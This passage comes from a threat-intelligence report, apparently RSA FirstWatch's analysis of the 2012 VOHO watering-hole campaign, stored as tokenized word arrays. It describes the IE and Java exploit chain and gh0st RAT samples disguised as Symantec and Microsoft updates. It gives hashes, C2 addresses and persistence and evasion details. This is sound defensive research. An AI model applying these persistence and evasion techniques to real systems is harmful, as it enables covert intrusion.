"xxxxxxxcurling.com/Results/cx/magma/iframe.js", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/module.php", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/engine.js", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/if.htm", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/enblue.htm", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/book.cab"], ["4"], ["", "."], ["Figure", "1:", "iFrame", ".", "js", "Flow"], ["Iframe", ".", "js"], ["Iframe", ".", "js", "checks", "if", "the", "visiting", "machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet"], ["Explorer", ".", "It", "also", "sets", "a", "cookie", "value", "(presumably", "to", "track", "individual", "visits)", ".", "If", "the", "visiting"], ["machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet", "Explorer", ",", "it", "forward", "to"], ["module", ".", "php."], ["Module", ".", "php"], ["Module", ".", "php", "uses", "a", "simple", "redirection", "script", "to", "redirect", "the", "browser", "to", "Engine", ".", "js"], ["Engine", ".", "js"], ["Engine", ".", "js", "looks", "for", "processes", "related", "to", "the", "following", "antivirus", "engines", "using", "an", "older"], ["vulnerability", "in", "Internet", "Explorer", "(CVE-2007-4848)", "that", "allows", "local", "file", "enumeration:"], ["\u2022"], ["Trend", "Micro"], ["\u2022"], ["McAfee"], ["\u2022"], ["Symantec"], ["However", ",", "the", "results", "of", "this", "check", "don\u2019t", "change", "the", "outcome", "of", "the", "script", "running", "in", "all", "cases;"], ["it", "simply", "results", "in", "the", "loading", "of", "\u201cif", ".", "htm\u201d.", "We", "believe", "this", "to", "be", "a", "case", "of", "existing", "exploit"], ["script", "re-use", ",", "with", "slight", "changes", "to", "suit", "the", "attackers", "current", "purpose", "."], ["5"], ["This", "particular", "enumeration", "script", "was", "seen", "previously", "in", "APT-style", "attacks", "back", "in", "July", "of", "2011", ","], ["as", "detailed", "here", "on", "the", "contagiodump", "blog", "iv", ".", "Within", "the", "blog", ",", "noted", "industry", "researcher", "Mila"], ["Parkour", ",", "cited", "the", "presence", "and", "use", "of", "borrowed", "scripts", "having", "likely", "originated", "in", "Asia", ","], ["specifically", "the", "so", "called", "xKungfoo", "script", "in", "attacks", "launched", "associated", "with", "numerous"], ["campaigns", "targeted", "at", "political", "dissidents", ".", "v", "Additionally", ",", "Ms", ".", "Parkour", "has", "also", "noted", "and"], ["documented", "the", "presence", "of", "this", "weaponizable", "code", "in", "numerous", "locales", "on", "the", "Internet"], ["today", ".", "vi", "vii", "In", "the", "following", "figures", "evidence", "of", "the", "presence", "and", "availability", "of", "the", "xKungFoo"], ["script", "(the", "script", "referenced", "by", "Mila", "Parkour", "and", "noted", "as", "being", "germane", "to", "the", "RSA"], ["FirstWatch", "investigation)", "along", "with", "endorsement", "by", "the", "author", "can", "be", "seen:"], ["Figure", "2:", "Website", "Where"], ["xKungFoo", "Script", "Originates"], ["Figure", "3:", "Example", "of", "xKungFoo"], ["Script", "Originates"], ["Figure", "4:", "Endorsement", "by"], ["Author", "Regarding", "xKungFoo"], ["6"], ["If", ".", "htm"], ["1)", "Checks", "if", "the", "visiting", "host\u2019s", "user", "agent", "reflects", "is", "one", "of", "the", "following:"], ["\u2022"], ["Unknown"], ["\u2022"], ["Windows", "XP"], ["\u2022"], ["Windows", "2003"], ["\u2022"], ["Windows", "VistaWindows", "7"], ["Checks", "if", "the", "visiting", "hosts", "language", "settings", "are:"], ["\u2022"], ["English"], ["\u2022"], ["Chinese"], ["\u2022"], ["French"], ["\u2022"], ["German"], ["\u2022"], ["Japanese"], ["\u2022"], ["Portuguese"], ["\u2022"], ["Korean"], ["\u2022"], ["Russian"], ["Enblue", ".", "htm"], ["Enblue", ".", "htm", "uses", "the", "CVE-2012-1889", "XML", "vulnerability", "to", "compromise", "the", "visiting", "browser", ","], ["which", "results", "in", "a", "pull", "and", "installation", "of", "the", "gh0st", "RAT", "malware", "."], ["This", "script", "also", "appears", "to", "be", "code", "reuse", "of", "a", "script", "seen", "on", "pastebin", "as", "follows:"], ["http://pastebin", ".", "com/VfmuhEiq"], ["Interestingly", ",", "this", "code", "was", "also", "purportedly", "used", "in", "previous", "nation-state", "sponsored", "attacks"], ["on", "Gmail", "accounts", "viii", "."], ["Book", ".", "cab"], ["Book", ".", "cab,", "the", "final", "payload", ",", "is", "an", "obfuscated", "executable", "which", ",", "when", "de-obfuscated", "using"], ["XOR", "95", ",", "is", "the", "gh0st", "RAT", "sample", "named", "\u201cvptray", ".", "exe\u201d", "(e6b43"], ["c299a9a1f5abd9be2b729e54577)"], ["Phase", "II", "-", "Exploit", "Chain", "\u2013", "Sun", "Java"], ["Phase", "II", "of", "this", "campaign", ",", "using", "the", "same", "infrastructure", ",", "but", "with", "a", "different", "directory", "for", "the"], ["exploit", "chain", "files", "as", "follows:"], ["[Watering", "Hole", "Sites]"], ["hxxp://xxxxxcountymd", ".", "gov", "(or", "other", "water", "hole", "site)", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/iframe.js", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/module.php", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/engine.js", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/if.htm", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/applet.jar"], ["7"], ["Figure", "5:", "Java", "Exploit", "Chain"], ["If", ".", "htm"], ["In", "this", "case", ",", "all", "of", "the", "scripts", "were", "identical", "up", "to", "\u201cif", ".", "htm\u201d,", "which", "instead", "contained", "a", "java", "call"], ["that", "loaded", "applet", ".", "jar,", "as", "well", "as", "a", "large", "blob", "of", "obfuscated", "code", "as", "a", "\u201cparam\u201d", "element", ".", "This"], ["large", "blob", "of", "code", "is", "a", "binary", "obfuscated", "with", "XOR", "77", ",", "which", "the", "java", "applet", "deobfuscates", "and"], ["runs", "as", "\u201csvohost", ".", "exe\u201d", "(2fe340fe2574ae540bd98bd9af8ec67d)", "."], ["Figure", "6:", "Java", "Applet", "Deobfuscates"], ["and", "Runs", "as", "\u201csvohost", ".", "exe\u201d"], ["8"], ["\u201cWatering", "Hole\u201d", "Specifics"], ["Strategically", ",", "the", "idea", "of", "using", "a", "target\u2019s", "interests", "and", "likely", "access", "points", "is", "not", "a", "new", "method"], ["of", "attack", ".", "Undertaking", "it", "on", "such", "a", "large", "scale", ",", "however", ",", "is", "notable", "and", "unusual", "in", "the", "APT"], ["space", "."], ["In", "this", "campaign", ",", "five", "separate", "\u201cclasses\u201d", "of", "sites", "that", "were", "compromised", "and", "trojanized", "to"], ["redirect", "to", "the", "exploit", "chains", "on", "the", "sporting", "group", "website", ".", "They", "were:"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Boston", ",", "MA", "area"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "Political", "Activism"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Washington", ",", "DC", "and", "its", "suburbs"], ["areas"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Defense", "Industrial", "Base"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Education"], ["Additionally", ",", "there", "were", "a", "spattering", "of", "non-related", "sites", "that", "appeared", "to", "be", "simple"], ["redirectors", "to", "one", "of", "the", "above-categorized", "sites", ".", "This", "sort", "of", "redirector", "is", "often", "used", "in", "spam"], ["campaigns", "to", "obfuscate", "the", "final", "location", "of", "the", "exploit", "server", "in", "an", "attempt", "to", "bypass", "email"], ["malware", "controls", ".", "While", "we", "don\u2019t", "have", "specific", "examples", "of", "related", "spam", "activity", ",", "this", "seems"], ["a", "likely", "such", "use", "of", "the", "additional", "sites", "."], ["One", "of", "the", "main", "sources", "of", "infection", "for", "these", "campaigns", "were", "sites", "that", "support", "the", "cause", "of"], ["democratic", "process", "in", "non-permissive", "environments", ",", "or", "the", "communication", "of", "information"], ["related", "to", "free", "speech", ".", "That", "is", ",", "entities", "and", "people", "that", "seek", "to", "promote", "democratic"], ["government", "in", "countries", "whose", "existing", "political", "structure", "and", "power", "doesn\u2019t", "support", "(and"], ["indeed", ",", "persecutes)", "such", "governmental", "change", ".", "This", "particular", "strategic", "vector", "has", "been"], ["observed", "in", "prior", "nation-state", "sponsored", "attacks", "."], ["Though", "several", "sites", "were", "targeted", "by", "the", "adversarial", "element", "behind", "this", "campaign", "some"], ["stood", "out", "due", "to", "their", "relationships", "to", "matters", "of", "geopolitical", "relevance", ",", "philanthropy", ",", "and"], ["news", "media", ".", "Five", "primary", "sites", "were", "compromised", "and", "used", "as", "pivot", "sites", "from", "a", "water", "holing"], ["perspective", "in", "this", "campaign", "."], ["They", "were", "largely", "North", "American", "with", "the", "exception", "of", "one"], ["European", "example", ".", "Additionally", ",", "a", "large", "percentage", "of", "infection", "activity", "occurred", "as", "a", "result", "of"], ["sites", "compromised", "and", "converted", "into", "water", "holes", "that", "offered", "services", "to", "the", "Washington", ",", "DC"], ["and", "Boston", ",", "MA", "areas", ".", "As", "the", "political", "and", "governmental", "hub", "of", "the", "United", "States", "of", "America", ","], ["wholesale", "compromise", "of", "computers", "in", "this", "area", "would", "provide", "a", "wealth", "of", "intelligence", "for"], ["adversaries", "interested", "in", "political", "process", "and", "government", "action", ".", "Furthermore", "it", "should", "be"], ["noted", "that", "RSA", "FirstWatch", "has", "noted", "and", "verified", "the", "compromise", "of", "nearly", "one", "thousand"], ["unique", "organizations", "distinct", "from", "those", "noted", "within", "this", "work", "."], ["9"], ["Figure", "7:", "Industries", "and", "Regions"], ["Leveraged", "in", "\u201cWater", "Holing\u201d", "Activity"], ["Political"], ["Activism"], ["Metro"], ["Washington", ","], ["DC"], ["\u2022", "Government"], ["\u2022", "Education"], ["\u201cWatering"], ["Hole\u201d", "Pivot"], ["Sites"], ["Defense"], ["Industrial"], ["Base"], ["Metro"], ["Boston"], ["\u2022", "Financial"], ["Svcs"], ["Gh0st", "RAT"], ["RAT", "Overview"], ["Remote", "Access", "Tools\\Trojan", "(RAT)", "are", "typically", "offered", "as", "a", "\u201clegitimate\u201d", "remote", "administration"], ["tool", "for", "system", "administrators", ",", "but", "have", "largely", "been", "used", "for", "remote", "hacking", "and", "information"], ["collection", "for", "intelligence", "purposes", "or", "lateral", "movement", "activities", ".", "While", "they", "are", "similar", "in"], ["function", "to", "purpose-built", "botnets", ",", "which", "also", "tend", "to", "use", "client/server", "architecture", ",", "RATs"], ["typically", "offer", "a", "wide", "range", "of", "features", "rather", "than", "the", "single", "focus", "that", "most", "modern", "botnet"], ["malware", "adheres", "to", "."], ["Typically", ",", "RATs", "have", "the", "ability", "to:"], ["\u2022"], ["Capture", "keystrokes"], ["\u2022"], ["Remote", "monitoring", "of", "webcam", "and/or", "microphone"], ["\u2022"], ["File", "system", "search/browse"], ["\u2022"], ["Use", "of", "local", "command", "prompt"], ["\u2022"], ["Execution", "of", "arbitrary", "programs"], ["\u2022"], ["File", "download/upload"], ["Gh0st", "RAT", "Specifics"], ["Gh0st", "came", "to", "prominence", "following", "the", "2009", "publication", "of", "\u201cTracking", "Ghostnet:", "Investigating"], ["a", "Cyber", "Espionage", "Network\u201d", ",", "in", "which", "this", "malware", "was", "used", "to", "infiltrate", "computers", "associated"], ["with", "the", "Dalai", "Lama", "and", "was", "used", "to", "compromise", "information", "related", "to", "Tibetan", "affairs", "."], ["Gh0st", "contains", "all", "of", "the", "above-mentioned", "capabilities", "when", "successfully", "installed", "on", "a", "target"], ["PC", "."], ["An", "excellent", "overview", "of", "this", "tool", "can", "be", "found", "in", "the", "McAfee", "report", "titled", "\u201cKnow", "your"], ["Digital", "Enemy\u201d", "ix", "."], ["10"], ["Since", "the", "publication", "of", "this", "report", ",", "the", "use", "of", "gh0st", "in", "hacking", "incidents", "has", "exploded", ",", "with"], ["the", "RSA", "FirstWatch", "team", "being", "aware", "of", "at", "least", "50", "unique", "gh0st", "networks", ".", "This", "can", "be"], ["largely", "explained", ",", "much", "like", "the", "proliferation", "of", "ZeuS", "cybercrime", "malware", ",", "to", "the", "open"], ["availability", "of", "Gh0st", "source", "code", "on", "the", "internet", "."], ["When", "source", "code", "for", "this", "type", "of", "malware"], ["is", "available", "globally", "it", "allows", "\u201copen", "source\u201d", "evolution", "of", "the", "malware", "to", "add", "new", "features", "and"], ["capabilities", ",", "but", "more", "importantly", ",", "it", "permits", "the", "constant", "modification", "of", "\u201cindicators\u201d", "used", "by"], ["defenders", "to", "detect", "malware", "activity", "in", "their", "environment", "."], ["From", "an", "operational", "sense", ",", "having"], ["easy", "opportunity", "to", "modify", "source", "code", "allows", "a", "much", "more", "robust", "compromise", ",", "with"], ["decreased", "likelihood", "of", "attacker", "detection", "."], ["In", "many", "cases", "this", "detection", "is", "based", "on:"], ["1)"], ["Knowledge", "of", "known", "C2", "locations"], ["2)"], ["Detection", "of", "a", "common", "\u201cgh0st\u201d", "string", "that", "is", "seen", "in", "the", "network", "communication", "of"], ["\u201cunmodified\u201d", "gh0st", "configurations", "."], ["Figure", "8:", "Common", "Technique"], ["Empolyed", "by", "Gh0st", "Networks"], ["Operators"], ["A", "common", "countermeasure", "used", "by", "operators", "of", "gh0st", "networks", "is", "to", "change", "this", "gh0st", "string"], ["prior", "to", "malware", "compilation", "to", "defeat", "basic", "IDS", "signatures", "."], ["VOHO", "Sample", "Analysis"], ["Fake", "Symantec", "Update", "\u2013", "Variant", "1"], ["VPTray", ".", "EXE"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["This", "malware", "comes", "in", "a", "UPX", "compressed", "binary", ",", "which", "disguises", "itself", "as", "an", "update", "from"], ["Symantec", "but", "instead", "it", "installs", "a", "backdoor", "in", "the", "target", "system", "."], ["When", "the", "malware", "is", "first", "executed", ",", "its", "first", "order", "of", "business", "is", "to", "install", "itself", "in", "the", "system", "."], ["It", "does", "this", "by", "dropping", "an", "exact", "copy", "of", "itself", "with", "the", "name", "VPTray", ".", "EXE", "in", "the", "current", "user\u2019s"], ["\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "It", "then", "modifies", "the", "Windows", "registry", "for", "it", "to", "autostart", "every"], ["boot", "up", ".", "It", "does", "this", "by", "using", "the", "following", "registry", "keys", "."], ["\u2022"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["HKEY_USERS\\<User\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["11"], ["By", "using", "the", "HKCU", "and", "HKU", "registry", "hives", ",", "the", "malware", "is", "targeting", "users", "that", "are", "currently"], ["logged", "into", "the", "machine", "when", "the", "initial", "infection", "began", "instead", "of", "the", "machine", "itself", ".", "This"], ["technique", "is", "especially", "useful", "when", "the", "target", "uses", "roaming", "profiles", "."], ["The", "malware", "adds", "the", "value", "\u201cSymantecUpdate\u201d", "to", "these", "keys", "and", "pass", "itself", "off", "as", "an", "update"], ["from", "Symantec", ".", "This", "is", "a", "simple", "technique", "that", "is", "designed", "to", "fool", "the", "untrained", "eye", ".", "To"], ["reinforce", "this", ",", "the", "malware", "employs", "a", "certain", "level", "of", "obfuscation", "to", "hide", "the", "data", ",", "which", "is", "the"], ["location", "and", "filename", "of", "the", "malware", ",", "by", "using", "HEX", "digits", "to", "represent", "each", "string", "characters"], ["instead", "of", "the", "more", "common", "ASCII", "."], ["In", "this", "case", ",", "instead", "of", "the", "data", "being:"], ["C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\VPTray", ".", "exe"], ["It", "is", "represented", "in", "the", "registry", "as:"], ["43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31"], [":5c:54:65:6d:70:5c:56:50:54:72:61:79:2e:65:78:65:00", "."], ["This", "installation", "technique", "of", "dropping", "an", "exact", "copy", "of", "itself", "tells", "us", "that", "the", "malware", "can"], ["survive", "and", "install", "itself", "without", "the", "aid", "of", "a", "dropper", "or", "a", "downloader", ".", "It", "has", "the", "capability", "to"], ["check", "whether", "it", "is", "running", "in", "the", "appropriate", "location", "and", "if", "it", "is", "properly", "installed", "on", "the"], ["system", ".", "If", "not", ",", "it", "proceeds", "with", "the", "installation", "process", ".", "This", "technique", "is", "advantageous", "if", "the"], ["malware", "has", "not", "been", "removed", "properly", ".", "A", "surviving", "main", "component", "can", "recreate", "what", "was"], ["removed", "including", "the", "necessary", "registry", "changes", "needed", "by", "the", "malware", "."], ["Aside", "from", "dropping", "VPTray", ".", "EXE", "it", "also", "drops", "the", "binary", "file", "UP", ".", "BAK", "in", "the", "same", "\u201cLocal"], ["Settings\\Temp\u201d", "folder", ".", "This", "is", "the", "backdoor", "component", "of", "the", "malware", ".", "Once", "all", "of", "these", "are"], ["accomplished", ",", "the", "original", "malware", "passes", "control", "to", "VPTray", ".", "EXE", "and", "then", "deletes", "itself", "to"], ["remove", "any", "traces", "of", "its", "existence", "."], ["Figure", "9:", "Memory", "dump", "of", "the"], ["malware", "containing", "the", "strings", "of"], ["the", "filenames", "of", "the", "dropped", "files"], ["and", "the", "registry", "value", "."], ["12"], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the"], ["following:"], ["\u2022"], ["Registry", "Editor", "is", "disabled"], ["\u2022"], ["Windows", "System", "Restore", "is", "disabled"], ["Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially"], ["those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before"], ["infection", "occurred", ".", "The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the"], ["system", "before", "infection", "."], ["The", "main", "component", ",", "VPTray", ".", "EXE,", "is", "the", "one", "that", "communicates", "directly", "to", "the", "botnet"], ["command", "and", "control", ".", "It", "connects", "to", "IP", "134", ".", "255.242.47", "via", "HTTPS", ".", "It", "remains", "active", "in", "the"], ["system", "listening", "constantly", "for", "instructions", "while", "keeping", "the", "other", "components", "in", "check", "."], ["Figure", "10:", "VPTray", ".", "exe", "connecting"], ["to", "IP", "134", ".", "255.242.47."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system:"], ["\u2022"], ["Presence", "of", "VPTray", ".", "EXE", "and", "UP", ".", "BAK", "in", "the", "User\u2019s", "\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "An"], ["infected", "Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS"], ["AND", "SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cSymantecUpdate\u201d", "with", "data", "in", "HEX", "values"], ["representing", "the", "file", "and", "location", "of", "VPTray", ".", "EXE", "in", "the", "following", "registry", "keys:"], ["o"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["o"], ["HKEY_USERS\\<User\u2019s", "Security"], ["ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["Presence", "of", "running", "process", "VPTray", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "the", "Registry", "Editor"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["Fake", "Symantec", "Update", "\u2013", "Variant", "2"], ["Dropper"], ["acc583fc596d38626d37cbf6de8a01cb"], ["VPTray", ".", "EXE"], ["b894efe4173f90479fddff455daf6ff3"], ["Unlike", "the", "first", "variant", ",", "this", "one", "is", "not", "compressed", ".", "Both", "the", "dropper", "and", "the", "dropped", "file"], ["(VPTray", ".", "EXE)", "are", "not", "compressed", ".", "Other", "difference", "it", "has", "with", "the", "first", "variant", "is", "the", "location"], ["of", "the", "dropped", "file", "and", "the", "way", "persistency", "is", "achieved", ".", "But", "its", "modus", "operandi", "remains", "the"], ["same", ",", "and", "that", "is", "to", "pretend", "to", "be", "a", "Symantec", "Live", "Update", "."], ["When", "the", "dropper", "is", "executed", ",", "it", "drops", "VPTray", ".", "EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\", "."], ["Having", "these", "file", "in", "a", "Symantec", "folder", "in", "Program", "Files", "is", "already", "a", "red", "flag", "especially", "if", "the"], ["compromised", "machine", "does", "not", "have", "a", "Symantec", "product", "installed", "."], ["13"], ["It", "then", "adds", "the", "registry", "key", "below", "to", "achieve", "persistency", "."], ["\u2022"], ["Key:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run"], ["\u2022"], ["Value:", "Symantec", "LiveUpdate"], ["\u2022"], ["Data:", "C:\\Program", "Files\\Symantec\\LiveUpdate\\VPTray", ".", "exe"], ["Obviously", ",", "the", "way", "it", "achieves", "persistency", "is", "totally", "different", "from", "variant", "1", "."], ["\u2022"], ["Variant", "2", "used", "a", "different", "registry", "hive"], ["\u2022"], ["Variant", "2\u2019s", "registry", "value", "is", "SymantecLiveUpdate", "compared", "to", "SymantecUpdate", "in"], ["variant", "1"], ["\u2022"], ["The", "registry", "data", "is", "in", "ASCII", "and", "not", "in", "HEX", ".", "This", "is", "fine", "because", "the", "malware", "file", "is"], ["located", "in", "a", "created", "Symantec", "folder", "in", "Program", "Files", "."], ["Figure", "11:", "Memory", "Dump", "of", "the"], ["Malware", "Containing", "the", "Strings", "of", "the"], ["Filenames"], ["To", "ensure", "its", "survival", ",", "the", "Windows", "System", "Restore", "is", "disabled", ".", "But", "unlike", "the", "first", "variant", ","], ["this", "one", "did", "not", "disable", "the", "registry", "editor", "due", "to", "the", "fact", "that", "the", "added", "registry", "value", "and"], ["data", "appears", "to", "be", "legitimate", "because", "it", "utilizes", "a", "location", "of", "the", "file", "that", "appears", "to", "be", "a"], ["normal", "location", "for", "a", "Symantec", "file", "."], ["To", "communicate", "to", "the", "attacker", "the", "main", "component", ",", "VPTray", ".", "EXE,", "connects", "to", "the", "domain"], ["usc-data", ".", "suroot.com."], ["14"], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system:"], ["\u2022"], ["Presence", "of", "VPTray", ".", "EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cSymantecLiveUpdate\u201d", "with", "the", "data", "\u201cC:\\Program"], ["Files\\Symantec\\LiveUpdate\\VPTray", ".", "EXE\u201d", "in"], ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run"], ["\u2022"], ["Presence", "of", "running", "process", "VPTray", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["**", "As", "of", "this", "writing", ",", "the", "main", "component", ",", "VPTray", ".", "EXE,", "is", "not", "detected", "in", "VirusTotal", "using", "its"], ["hash", "search", "function", "."], ["Fake", "Microsoft", "Update"], ["Svohost", ".", "EXE"], ["2fe340fe2574ae540bd98bd9af8ec67d"], ["Similar", "to", "the", "Fake", "Symantec", "Update", ",", "this", "malware", "comes", "in", "a", "UPX", "compressed", "binary", "file", ".", "It"], ["passes", "itself", "off", "as", "a", "Microsoft", "update", "but", "nothing", "can", "be", "further", "from", "the", "truth", "."], ["When", "the", "malware", "is", "first", "executed", ",", "it", "installs", "itself", "in", "the", "system", "similar", "to", "the", "method"], ["employed", "by", "the", "Fake", "Symantec", "Update", ".", "The", "only", "difference", "is", "the", "file", "that", "is", "dropped", "and"], ["registry", "value", "and", "data", "it", "uses", ".", "The", "file", "is", "dropped", "in", "the", "current", "user\u2019s", "\u201cLocal", "Settings\\Temp\u201d"], ["folder", "and", "is", "named", "SVOHOST", ".", "EXE,", "which", "is", "an", "exact", "copy", "of", "the", "malware", ".", "This", "technique", "of"], ["naming", "a", "file", "almost", "similar", "to", "a", "legitimate", "file", "(SVCHOST", ".", "EXE)", "is", "known", "as", "homographic"], ["obfuscation", ".", "But", "in", "this", "case", ",", "the", "less", "elegant", "method", "is", "used", ",", "and", "that", "is", "to", "simply", "replace", "one"], ["letter", "with", "another", ".", "To", "autostart", ",", "the", "malware", "utilized", "the", "same", "registry", "keys", "as", "the", "Fake"], ["Symantec", "Update", "."], ["\u2022"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["HKEY_USERS\\<User\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["By", "using", "these", "registry", "hives", ",", "the", "malware", "is", "able", "to", "target", "users", "that", "are", "currently", "logged", "into"], ["the", "machine", "even", "those", "that", "are", "not", "currently", "active", "in", "the", "system", "(think", "of", "Switch", "User", "mode)", "."], ["The", "malware", "adds", "the", "value", "\u201cMicrosoft", "Update\u201d", "to", "these", "keys", ".", "A", "common", "technique", ",", "a", "very"], ["typical", "malware", "deception", ",", "to", "fool", "users", "into", "believing", "it", "is", "something", "that", "it", "is", "not", ".", "Aside", "from"], ["this", ",", "it", "also", "utilizes", "HEX", "digits", "to", "obfuscate", "the", "registry", "data", ",", "which", "represents", "the", "location", "and"], ["the", "filename", "of", "the", "malware", "."], ["So", "instead", "of", "the", "data", "being", "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\svohost", ".", "exe", "for", "an"], ["infected", "Administrator", "account", "in", "Windows", "XP", ",", "it", "appears", "as"], ["43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31"], [":5c:54:65:6d:70:5c:73:76:6f:68:6f:73:74:2e:65:78:65:00", "."], ["Once", "all", "the", "malware", "installation", "procedure", "is", "done", ",", "the", "original", "malware", "passes", "control", "to"], ["SVOHOST", ".", "EXE", "and", "deletes", "itself", "to", "hide", "any", "traces", "of", "its", "existence", "."], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the"], ["following:"], ["\u2022"], ["Registry", "Editor", "is", "disabled"], ["\u2022"], ["Windows", "System", "Restore", "is", "disabled"], ["15"], ["Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially"], ["those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before"], ["infection", "occurred", ".", "The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the"], ["system", "before", "infection", ".", "To", "communicate", "to", "the", "attacker", ",", "the", "malware", "connects", "to", "IP"], ["58", ".", "64.155.59."], ["Figure", "12:", "SVOHOST", ".", "EXE"], ["connecting", "to", "58", ".", "64.155.59."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system", "."], ["\u2022"], ["Presence", "of", "SVOHOST", ".", "EXE", "in", "the", "User\u2019s", "\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "An", "infected"], ["Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS", "AND"], ["SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\"], ["\u2022"], ["Presence", "of", "the", "registry", "value", "\u201cMicrosoft", "Update\u201d", "with", "data", "in", "HEX", "values", "representing"], ["the", "file", "and", "location", "of", "SVOHOST", ".", "EXE", "in", "the", "following", "registry", "keys:"], ["o"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["o"], ["HKEY_USERS\\<User\u2019s", "Security"], ["ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["Presence", "of", "running", "process", "SVOHOST", ".", "EXE"], ["\u2022"], ["Unable", "to", "use", "the", "Registry", "Editor"], ["\u2022"], ["Unable", "to", "use", "Windows", "System", "Restore"], ["VOHO", "Campaign", "Analysis"], ["RSA", "FirstWatch", "research", "examined", "HTTP", "logs", "covering", "the", "June/July", "2012", "timeframe", "for", "the"], ["exploit", "chain", "in", "this", "example", ".", "This", "analysis", ",", "combined", "with", "a", "detailed", "understanding", "of", "the"], ["exploit", "mechanism", ",", "allowed", "the", "team", "to", "get", "a", "better", "understanding", "of", "the", "scope", "of"], ["compromise", "of", "this", "campaign", "."], ["Based", "on", "our", "analysis", ",", "we", "can", "determine", "that", "this", "attack", "was", "broken", "up", "into", "two", "phases", "."], ["Phase", "1"], ["We", "observed", "referral", "traffic", "begin", "on", "June", "25", ",", "2012", "to", "the", "exploit", "site", ".", "However", ",", "according", "to"], ["the", "server", "logs", ",", "actual", "exploitation", "of", "Internet", "Explorer", "began", "on", "July", "9", ",", "2012", "at", "approximately"], ["7:56", "AM", "EST", "when", "the", "first", "successful", "exploits", "of", "visiting", "browsers", "began", "to", "hit", "the", "exploit"], ["code", ".", "We", "observed", "some", "movement", "of", "exploit", "code", "across", "directories", "on", "the"], ["*******curling", ".", "com", "web", "server", "during", "the", "investigation", ",", "so", "this", "gap", "was", "likely", "caused", "by", "the"], ["attacker", "setting", "up", "a", "new", "campaign", ".", "Phase", "1", "exploit", "activity", "continued", "over", "the", "course", "of", "two"], ["days", ",", "with", "continuous", "access", ",", "until", "July", "10th", ",", "when", "activity", "stopped", "at", "3:43", "pm", "EST", "."], 